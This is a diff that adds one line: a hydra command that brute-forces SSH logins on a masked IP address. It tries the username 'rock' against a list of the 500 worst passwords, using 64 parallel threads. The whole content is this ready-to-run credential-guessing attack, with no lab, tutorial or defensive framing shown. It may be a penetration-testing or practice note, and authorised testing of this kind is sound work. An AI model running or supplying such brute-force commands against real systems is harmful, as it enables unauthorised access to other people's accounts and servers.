@@ -1,0 +1,1 @@
+hydra -l rock -P 500-worst-passwords.txt ssh://xxx.xxx.xxx.xxx -V -t 64
